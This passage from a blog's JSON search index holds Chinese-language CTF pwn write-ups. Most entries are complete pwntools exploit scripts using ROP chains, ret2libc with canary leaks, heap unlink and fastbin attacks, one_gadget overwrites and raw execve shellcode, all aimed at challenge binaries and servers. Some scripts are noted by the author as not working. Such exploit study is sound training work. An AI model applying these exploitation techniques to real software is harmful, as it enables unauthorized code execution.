最后，编译成功","categories":[],"tags":[]},{"title":"glibc","slug":"glibc","date":"2024-09-13T09:02:48.000Z","updated":"2024-11-03T13:08:43.068Z","comments":true,"path":"2024/09/13/glibc/","link":"","permalink":"http://example.com/2024/09/13/glibc/","excerpt":"","text":"手动下载glibc版本 有时候做题会遇到glibc-all-in-one里没有的glibc,需要自己下 可以到网站手动下载对应的./deb文件 http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/ 在glibc-all-in-one目录下，若glibc版本名为x,用指令解压 ./extract ./x.deb ./libs/x","categories":[],"tags":[]},{"title":"gostack","slug":"gostack","date":"2024-09-12T11:31:39.000Z","updated":"2024-09-13T12:15:12.764Z","comments":true,"path":"2024/09/12/gostack/","link":"","permalink":"http://example.com/2024/09/12/gostack/","excerpt":"","text":"i 一个用go语言写的程序。 alt+f7用go_parser修复一下 主要的函数，只有一个输入点，因为是go语言写的，其反汇编也是很难看懂 主要看汇编,它后面会将输入的字符串复制到栈上 在scanner输入这里会检查这个位置的值是否为0 为了方便全都用0填充 脚本的具体调试是报错的，看不了，也只能分析个大概。 直接gdb 算出距离rbp是0x1c8的距离。 这种题一般是用ret2syscall。而往年的国赛题也是ret2syscall居多。 找到的gadget syscall;ret是很难找到的。通过gadget找不到。 先sys_read在bss段输入bin/sh,再sys_execve. #bss read payload=b&#39;\\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6 payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret) #execve payload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret) 同时也顺带复习一下，sys_read的各个寄存器的值，rax=0,rdi=0,rsi=bss,rdx=size.sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0.前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。from pwn import* from LibcSearcher import * p=remote(&quot;pwn.challenge.ctf.show&quot;,28159) #p=process(&quot;./gostack&quot;) context.log_level=&quot;debug&quot; context(arch=&#39;amd64&#39;,os=&#39;linux&#39;) #payload=b&#39;a&#39;*0x1d0+p64(0x4A0af6) pop_rdi_r14=0x4a18a5 pop_rax=0x40f984 bss=0x5655C2 pop_rsi=0x42138a pop_rdx=0x4944ec syscall_ret=0x4616C9 #gdb.attach(p) #pause() #bss read payload=b&#39;\\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6 payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret) #exceve payload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret) #p.recv() p.sendlineafter(&#39;magic message :&#39;,payload) p.sendline(b&#39;/bin/sh\\x00&#39;) p.interactive()","categories":[],"tags":[]},{"title":"pstack","slug":"pstack","date":"2024-09-08T08:40:58.000Z","updated":"2024-09-08T08:40:58.239Z","comments":true,"path":"2024/09/08/pstack/","link":"","permalink":"http://example.com/2024/09/08/pstack/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"武功论剑","slug":"武功论剑","date":"2024-07-27T05:23:02.000Z","updated":"2024-07-27T06:22:30.638Z","comments":true,"path":"2024/07/27/武功论剑/","link":"","permalink":"http://example.com/2024/07/27/%E6%AD%A6%E5%8A%9F%E8%AE%BA%E5%89%91/","excerpt":"","text":"一道很简单的apk题，反汇编出来，将两个数组的值一一异或就得到flag 这道简单的栈溢出题，开了canary保护 这里输入0x49个字节可以将canary和rbp打印出来 主函数有个栈溢出漏洞，这里ret2libc泄露puts的got表地址，再返回重新输入一次 from pwn import* from LibcSearcher import * #p=remote(&quot;59.62.61.30&quot;,46489) p=process(&quot;./pwn&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) pop_rdi=0x400853 puts_got=0x601018 call_puts=0x4007af payload=b&#39;a&#39;*0x48+b&#39;b&#39; puts_plt=0x400580 #pause() p.send(payload) p.recvuntil(&#39;b&#39;) canary=u64(p.recv(7).rjust(8,b&#39;\\x00&#39;)) rbp_addr=u64(p.recv(6).ljust(8,b&#39;\\x00&#39;)) print(hex(canary)) print(&#39;rbp&#39;+hex(rbp_addr)) payload=b&#39;b&#39;*0x48+p64(canary)+p64(rbp_addr-0x50) payload+=p64(pop_rdi)+p64(puts_got)+p64(call_puts) gdb.attach(p) sleep(1) pause() p.sendlineafter(&#39;overflow!&#39;,payload) p.recvline() puts=u64(p.recv(6).ljust(8,b&#39;\\x00&#39;)) base=puts-libc.sym[&#39;puts&#39;] system=base+libc.sym[&#39;system&#39;] binsh=base+next(libc.search(b&#39;bin/sh&#39;)) print(&#39;puts&#39;+hex(puts)) one=[0x4f3d5,0x4f432,0x10a41c] one_gadget=base+one[0] # p.recvline() payload=b&#39;a&#39;*0x48+p64(canary)+b&#39;a&#39;*8+p64(one_gadget) #+p64(pop_rdi)+p64(binsh)+p64(system) p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_pwn","slug":"ciscn-pwn","date":"2024-05-19T08:17:29.000Z","updated":"2024-05-20T15:09:28.133Z","comments":true,"path":"2024/05/19/ciscn-pwn/","link":"","permalink":"http://example.com/2024/05/19/ciscn-pwn/","excerpt":"","text":"第一天_gostack64位的静态编译题 很明显的syscall和很多可以利用的gadget 利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag from pwn import* from LibcSearcher import * p=remote(&quot;8.147.134.47&quot;,16589) #p=process(&quot;./gostack&quot;) elf=ELF(&#39;./gostack&#39;) context.log_level=&quot;debug&quot; # Gadgets and syscall addresses syscall_address = 0x404043 rax_ret_address = 0x40f984 rdi_6_ret_address = 0x4a18a5 rsi_ret_address = 0x42138a rdx_ret_address = 0x4944ec # Create the payload payload = b&#39;a&#39; * 0x100 payload += p64(elf.bss()) + p64(0x10) + p64(0) * 0x18 payload += p64(rdi_6_ret_address) + p64(0) * 6 payload += p64(rsi_ret_address) + p64(elf.bss() + 0x200) payload += p64(rdx_ret_address) + p64(0x100) payload += p64(rax_ret_address) + p64(0) payload += p64(syscall_address) payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5 payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5 payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5 payload += p64(rsi_ret_address) + p64(0) payload += p64(rdx_ret_address) + p64(0) payload += p64(rax_ret_address) + p64(0x3b) payload += p64(syscall_address) # Send the payload p.sendlineafter(&#39;message :\\n&#39;, payload) input() p.sendline(&#39;/bin/sh\\x00&#39;) p.interactive() EzHeap edit函数存在堆溢出 开启了沙箱保护,这是一道堆的orw。 泄露出堆的基地址add_chunk(0x28) add_chunk(0x28) # Edit and leak heap address edit_chunk(0, 0x50, b&#39;a&#39; * 0x50) show_chunk(0) io.recvuntil(b&#39;a&#39; * 0x50) gdb.attach(io) pause() heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\\x00&#39;)) heap_base = heap_leak &lt;&lt; 12 将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flagfrom pwn import * elf = ELF(&quot;./EzHeap&quot;) context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; io=process(&#39;EzHeap&#39;) #io = remote(&#39;8.147.129.121&#39;, 26987) def add_chunk(size, content=b&#39;&#39;): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;1&#39;) io.sendlineafter(&quot;size:&quot;, str(int(size))) io.sendafter(&quot;content:&quot;, content) def delete_chunk(index): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;2&#39;) io.sendlineafter(&quot;idx:&quot;, str(index)) def edit_chunk(index, size, content): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;3&#39;) io.sendlineafter(&quot;idx:&quot;, str(index)) io.sendlineafter(&quot;size:&quot;, str(size)) io.sendafter(&quot;content:&quot;, content) def show_chunk(index): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;4&#39;) io.sendlineafter(&quot;idx:&quot;, str(index)) def exit_program(): io.sendlineafter(&quot;choice &gt;&gt; &quot;, &#39;5&#39;) # Add initial chunks add_chunk(0x28) add_chunk(0x28) # Edit and leak heap address edit_chunk(0, 0x50, b&#39;a&#39; * 0x50) show_chunk(0) io.recvuntil(b&#39;a&#39; * 0x50) gdb.attach(io) pause() heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\\x00&#39;)) heap_base = heap_leak &lt;&lt; 12 # Edit chunk to set up fake chunk edit_chunk(0, 0x50, b&#39;\\x00&#39; * 0x28 + p64(0x21) + b&#39;\\x00&#39; * 0x18 + p64(0xd1)) # Leak libc address edit_chunk(1, 0x30, b&#39;a&#39; * 0x30) show_chunk(1) io.recvuntil(b&#39;a&#39; * 0x30) libc_leak = u64(io.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8, b&#39;\\x00&#39;)) libc_base = libc_leak - 0x21ace0 # Edit chunk to consolidate chunks edit_chunk(1, 0x30, b&#39;\\x00&#39; * 0x28 + p64(0xf1)) # Set up libc addresses setcontext_address = libc_base + 0x539e0 + 61 read_address = libc_base + 0x1147d0 write_address = libc_base + 0x114870 rtld_global_address = libc_base + 0x285040 rtld_3_address = libc_base + 0x2865a0 pop_rdi = libc_base + 0x2a3e5 pop_rsi = libc_base + 0xe7d0d pop_rdx = libc_base + 0x11f2e7 # r12 ret = libc_base + 0x1193c1 pop_rax = libc_base + 0x45eb0 syscall = libc_base + 0x91316 target_address = ((heap_base + 0x1e30) &gt;&gt; 12) ^ rtld_global_address # Add chunks to manipulate heap add_chunk(0x78) # Chunk 2 add_chunk(0x78) # Chunk 3 add_chunk(0x78) # Chunk 4 add_chunk(0x78) # Chunk 5 edit_chunk(5, 0x100, b&#39;a&#39; * 0x78 + p64(0x21) + p64(target_address)) add_chunk(0x18) # Chunk 6 add_chunk(0x18) # Chunk 7 add_chunk(0x18) # Chunk 8 add_chunk(0x18) # Chunk 9 add_chunk(0x18, p64(heap_base + 0x300) + p64(5) + p64(rtld_3_address)) heap_leak_adjusted = heap_base - 0x650 l_next_address = libc_base + 0x286890 # Create link map link_map = p64(0) link_map += p64(l_next_address) link_map += p64(0) link_map += p64(heap_leak_adjusted + 0x940) link_map += p64(0) * 28 link_map += p64(heap_leak_adjusted + 0xa50) link_map += p64(heap_leak_adjusted + 0xa70) link_map += p64(heap_leak_adjusted + 0xa60) link_map += p64(0x10) link_map += p64(setcontext_address) link_map += p64(ret) link_map += p64(0) * 13 link_map += p64(heap_leak_adjusted + 0x200) link_map += b&#39;./flag&#39;.ljust(8, b&#39;\\x00&#39;) link_map += p64(0) link_map += p64(0x100) link_map += p64(0) * 2 link_map += p64(heap_leak_adjusted + 0xc60) link_map += p64(ret) link_map += p64(0) * 38 link_map += p64(0x800000000) # Create ROP chain rop_chain = p64(ret) * 0x1 rop_chain += p64(pop_rdi) + p64(heap_leak_adjusted + 0xaf0) rop_chain += p64(pop_rax) + p64(2) rop_chain += p64(pop_rsi) + p64(0) rop_chain += p64(syscall) rop_chain += p64(pop_rdi) + p64(3) rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800) rop_chain += p64(pop_rdx) + p64(0x50) + p64(0) rop_chain += p64(read_address) rop_chain += p64(pop_rdi) + p64(1) rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + 0x800) rop_chain += p64(pop_rdx) + p64(0x50) + p64(0) rop_chain += p64(write_address) # Edit chunk with link map and ROP chain edit_chunk(0, 0x400, link_map + rop_chain) # Exit and trigger the payload exit_program() io.interactive()","categories":[],"tags":[]},{"title":"easyshell","slug":"easyshell","date":"2024-05-02T14:42:19.000Z","updated":"2024-05-04T14:04:26.139Z","comments":true,"path":"2024/05/02/easyshell/","link":"","permalink":"http://example.com/2024/05/02/easyshell/","excerpt":"","text":"from pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./babyheap&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;libc.so&#39;) elf=ELF(&#39;babyheap&#39;) p.recvuntil(&#39;captcha is: &#39;) cap=p.recv(8) p.sendlineafter(&#39;the captcha: &#39;,cap) #p.sendlineafter( #p.sendlineafter(&#39;Please Select: &#39;,) def add(index,size): p.sendlineafter(&#39;Please Select: &#39;,&#39;1&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.sendlineafter(&#39;Size: &#39;,str(size)) def fill(size,content): p.sendlineafter(&#39;Please Select: &#39;,&#39;3&#39;) p.sendlineafter(&#39;Size: &#39;,str(size)) p.sendlineafter(&#39;Content: &#39;,content) gdb.attach(p) sleep(1) add(20,0x60) p.interactive()","categories":[],"tags":[]},{"title":"heap","slug":"heap","date":"2024-04-27T13:35:10.000Z","updated":"2024-05-16T13:11:28.313Z","comments":true,"path":"2024/04/27/heap/","link":"","permalink":"http://example.com/2024/04/27/heap/","excerpt":"","text":"chunk就是一整个 malloc返回的指针指向chunk的数据区域 free返回的指针指向chunk的header pre_size只有在上一个chunk（物理相邻）是释放时才属于下一个chunk的区域，否则属于上一个chunk的 free_chunk的大小 0x20~0x0x80,malloc(8)得到的是0x20的chunk","categories":[],"tags":[]},{"title":"note2","slug":"note2","date":"2024-04-26T11:00:38.000Z","updated":"2024-04-28T15:31:44.297Z","comments":true,"path":"2024/04/26/note2/","link":"","permalink":"http://example.com/2024/04/26/note2/","excerpt":"","text":"没开偏移的保护 size是无符号数 进函数后变有符号数，会有溢出 这里只能用字节来填充，b’\\x00’都不行 改了free_got才free的，会执行one_gadget 用system打会报错，不行 因为这里有个strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);函数，遇到‘\\0’或空字符截停 expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,27431) p=process(&quot;./note2&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) elf=ELF(&#39;./note2&#39;) p.sendlineafter(&#39; name:&#39;,&#39;sdf&#39;) p.sendlineafter(&#39;address:&#39;,&#39;asdf&#39;) def add(size,content): p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;) p.sendlineafter(&#39;(less than 128)&#39;,str(size)) p.sendlineafter(&#39; content:&#39;,content) def show(index): p.recvuntil(&quot;&gt;&gt;&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;:&quot;) p.sendline(str(index)) def edit(index, choice, content): p.recvuntil(&quot;&gt;&gt;&quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;:&quot;) p.sendline(str(index)) p.recvuntil(&quot;]&quot;) p.sendline(str(choice)) p.recvuntil(&quot;:&quot;) p.sendline(content) def free(index): p.recvuntil(&quot;&gt;&gt;&quot;) p.sendline(&quot;4&quot;) p.recvuntil(&quot;:&quot;) p.sendline(str(index)) &#39;&#39;&#39; io.recvuntil(&quot;:&quot;) io.sendline(&quot;/bin/sh&quot;) #name io.recvuntil(&quot;:&quot;) io.sendline(&quot;ddd&quot;) &#39;&#39;&#39; ptr=0x602120 fd=ptr-0x18 bk=ptr-0x10 payload=b&#39;\\x00&#39;*8+p64(0xa1)+p64(fd)+p64(bk) add(0x80,payload) #0 add(0,&#39;sadf&#39;) #1 add(0x80,&#39;bin/sh&#39;) #2 free(1) payload=p64(0)*2+p64(0xa0)+p64(0x90) add(0,payload) free(2) #b&#39;a&#39;*0x18 free_got=elf.got[&#39;free&#39;] payload=b&#39;a&#39;*0x18+p64(free_got) edit(0,1,payload) gdb.attach(p) sleep(1) show(0) p.recvuntil(&#39;is &#39;) addr=u64(p.recv(6).ljust(8,b&#39;\\x00&#39;)) base=addr-libc.sym[&#39;free&#39;] system=base+libc.sym[&#39;system&#39;] one=base+0xf02a4 edit(0,1,p64(system)) print(hex(addr)) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_final_5","slug":"ciscn-final-5","date":"2024-04-11T11:36:41.000Z","updated":"2024-04-11T13:45:47.262Z","comments":true,"path":"2024/04/11/ciscn-final-5/","link":"","permalink":"http://example.com/2024/04/11/ciscn-final-5/","excerpt":"","text":"没开偏移的保护 地址进行或运算后保存，最后一位存index","categories":[],"tags":[]},{"title":"GUESS","slug":"GUESS","date":"2024-03-23T10:34:29.000Z","updated":"2024-03-23T13:22:26.501Z","comments":true,"path":"2024/03/23/GUESS/","link":"","permalink":"http://example.com/2024/03/23/GUESS/","excerpt":"","text":"开了canary 在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数 把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移本地一直打不通，调试也有问题expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,26222) p=process(&quot;./GUESS&quot;) context.log_level=&quot;debug&quot; elf=ELF(&#39;./GUESS&#39;) puts_got=elf.got[&#39;puts&#39;] libc=ELF(&#39;./libc-2.23.so&#39;) payload=b&#39;a&#39;*0x128+p64(puts_got) p.recvuntil(&#39; guessing flag&#39;) p.sendline(payload) p.recvuntil(&#39;detected ***: &#39;) puts_addr=u64(p.recvuntil(&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;)) print(hex(puts_addr)) base=puts_addr-libc.sym[&#39;puts&#39;] environ=base+libc.sym[&#39;__environ&#39;] payload=b&#39;a&#39;*0x128+p64(environ) gdb.attach(p) p.recvuntil(&#39; guessing flag&#39;) p.sendline(payload) p.recvuntil(&#39;detected ***: &#39;) envi=u64(p.recvuntil(&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;)) print(hex(envi)) flag=envi-0x168 payload=b&#39;a&#39;*0x128+p64(flag) p.recvuntil(&#39; guessing flag&#39;) p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"bad","slug":"bad","date":"2024-03-22T06:08:42.000Z","updated":"2024-03-22T08:09:43.077Z","comments":true,"path":"2024/03/22/bad/","link":"","permalink":"http://example.com/2024/03/22/bad/","excerpt":"","text":"很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用seccomp_init(0LL);是初始化seccomp_init函数0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用 所以这道题只能用orw的方式获取flagmmap=0x123000 orw_payload=shellcraft.open(&#39;./flag&#39;) #打开根目录下的flag文件，文件标识符为3 orw_payload+=shellcraft.read(3,mmap,0x50) #读取文件标识符为3的文件的0x50个字节到地址mmap orw_payload+=shellcraft.write(1,mmap,0x50) #将mmap的地址的值输出 不把orw_payload写到栈上因为其很大 所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上 jmp_rsp_ret=asm(&#39;sub rsp,0x30;jmp rsp&#39;) get_shell=asm(&#39;mov rax,0x123000;call rax&#39;) payload=asm(shellcraft.read(0,mmap,0x100))+get_shell payload=payload.ljust(0x28,b&#39;\\x00&#39;) payload+=p64(jmp_rsp)+jmp_rsp_ret# 实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。最后再写入orw_payload就行了p.sendline(asm(orw_payload))","categories":[],"tags":[]},{"title":"b0verfl0w","slug":"b0verfl0w","date":"2024-03-20T15:07:25.000Z","updated":"2024-03-21T05:02:55.946Z","comments":true,"path":"2024/03/20/b0verfl0w/","link":"","permalink":"http://example.com/2024/03/20/b0verfl0w/","excerpt":"","text":"; 汇编指令 xor ecx, ecx ; 将 ecx 寄存器清零 mul ecx ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * 0 push ecx ; 将 ecx 寄存器中的值压入栈，此时栈顶为 0 push 0x68732f2f ; 将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈 push 0x6e69622f ; 继续将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈 mov ebx, esp ; 将 esp 寄存器中的值（即字符串 &quot;/bin//sh&quot; 的地址）存放到 ebx 寄存器中 mov al, 0xb ; 将 0xb 存放到 al 寄存器中，该值代表 execve 系统调用的编号 int 0x80 ; 触发系统调用，执行 execve(&quot;/bin//sh&quot;, NULL, NULL) shellcode=b&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;+b&quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;+b&quot;\\x0b\\xcd\\x80&quot; ret2shellcode,但是大小不够了 sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;) 改写其他不行返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址payload=asm(shellcode)+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sup_esp_jmp jmp esp的操作，把栈顶设为esp,同时eip指向栈顶 expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,28594) p=process(&quot;./b0verfl0w&quot;) context.log_level=&quot;debug&quot; context.arch=&#39;i386&#39; shellcode=b&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;+b&quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;+b&quot;\\x0b\\xcd\\x80&quot; print(len(shellcode)) #gdb.attach(p) sleep(1) jmp_esp=0x08048504 sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;) payload=shellcode+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sub_esp_jmp #p.sendline(payload) p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"roarctf_2019_easypwn","slug":"roarctf-2019-easy-pwn","date":"2024-03-18T15:03:09.000Z","updated":"2024-03-20T07:43:53.545Z","comments":true,"path":"2024/03/18/roarctf-2019-easy-pwn/","link":"","permalink":"http://example.com/2024/03/18/roarctf-2019-easy-pwn/","excerpt":"","text":"保护全开 edit函数 若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞 这里不太懂为什么伪造的堆1 free不会报错 free(1) add(0x90) 试用这种方法也能show出main_arena 至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小 add(0x80) 奇怪，这里再申请0x80的大小，然后size还是0xa1 这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21) 不过最后的话，是打不通的。expfrom pwn import * r=remote(&#39;node5.buuoj.cn&#39;,28118) #r=process(&#39;roarctf_2019_easy_pwn&#39;) libc=ELF(&#39;./libc-2.23.so&#39;) context.log_level=&quot;debug&quot; def add(size): r.recvuntil(&#39;choice: &#39;) r.sendline(&#39;1&#39;) r.recvuntil(&#39;size:&#39;) r.sendline(str(size)) def edit(index,size,data): r.recvuntil(&#39;choice: &#39;) r.sendline(&#39;2&#39;) r.recvuntil(&#39;index:&#39;) r.sendline(str(index)) r.recvuntil(&#39;size:&#39;) r.sendline(str(size)) r.recvuntil(&#39;content:&#39;) r.send(data) def free(index): r.recvuntil(&#39;choice: &#39;) r.sendline(&#39;3&#39;) r.recvuntil(&#39;index:&#39;) r.sendline(str(index)) def show(index): r.recvuntil(&#39;choice: &#39;) r.sendline(&#39;4&#39;) r.recvuntil(&#39;index:&#39;) r.sendline(str(index)) add(0x18) add(0x10) add(0x90) add(0x10) edit(0,0x22,b&#39;b&#39;*0x10+p64(0x20)+p8(0xa1)) edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21)) free(1) add(0x90) edit(1,0x20,p64(0)*3+p64(0xa1)) free(2) show(1) r.recvuntil(&#39;content:&#39;) r.recv(0x20) main_arena=u64(r.recvuntil(&#39;\\x7f&#39;).strip()[-6:].ljust(8,b&#39;\\x00&#39;))-88 malloc_hook=main_arena-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] realloc_hook=base+libc.sym[&#39;__realloc_hook&#39;] add(0x80) print(hex(main_arena)) payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21) edit(1,0x90,payload) free(2) payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23) edit(1,0x28,payload) add(0x60) #2 add(0x60) #4 one=[0x45216,0x4526a,0xf02a4,0xf1147] one_gadget=base+one[3] edit(4,0x1b,b&#39;a&#39;*11+p64(one_gadget)+p64(realloc_hook+4)) #gdb.attach(r) sleep(1) add(0x10) r.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_es_7","slug":"ciscn-2019-es-7","date":"2024-03-18T13:09:07.000Z","updated":"2024-03-18T14:42:13.095Z","comments":true,"path":"2024/03/18/ciscn-2019-es-7/","link":"","permalink":"http://example.com/2024/03/18/ciscn-2019-es-7/","excerpt":"","text":"初遇srop unix在系统发生signal时会间接调用sigreturn,ucontext,siginfo等会被压入栈中,这一段称为signal frame 要用srop，需满足几个条件 可以通过栈溢出控制栈的内容。 需要知道相应的地址。 “/bin/sh” ​ Signal Frame ​ syscall ​ sigreturn 题目中已经给了我们gadgets的地址 首先可以打印出栈地址 其次返回地址写上了0x4004F1,打印完会再次返回func函数","categories":[],"tags":[]},{"title":"hitcon2014_stkof","slug":"hitcon2014-stkof","date":"2024-03-16T14:10:58.000Z","updated":"2024-03-17T07:16:45.266Z","comments":true,"path":"2024/03/16/hitcon2014-stkof/","link":"","permalink":"http://example.com/2024/03/16/hitcon2014-stkof/","excerpt":"","text":"偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlinkadd(0x30) #1 add(0x30) #2 add(0x80) #3 add(0x30) #4 bss=0x602140+0x10 fd=bss-0x18 bk=bss-0x10 payload=p32(0)+p32(0x30) payload+=p64(fd)+p64(bk) payload+=p64(0)*2 payload+=p64(0x30)+p64(0x90) edit(2,payload)","categories":[],"tags":[]},{"title":"inndy_rop","slug":"inndy-rop","date":"2024-03-14T11:42:22.000Z","updated":"2024-03-14T11:54:01.299Z","comments":true,"path":"2024/03/14/inndy-rop/","link":"","permalink":"http://example.com/2024/03/14/inndy-rop/","excerpt":"","text":"除了个gets函数啥也没有了 直接 ROPgadget —binary inndy_rop —ropchain from pwn import* from struct import pack from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) r=process(&quot;./inndy_rop&quot;) context.log_level=&quot;debug&quot; p=b&#39;a&#39;*(0xc+4) p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret p += b&#39;/bin&#39; p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4 p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret p += b&#39;//sh&#39; p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080de769) # pop ecx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806c943) # int 0x80 #gdb.attach(p) #sleep(1) r.sendline(p) 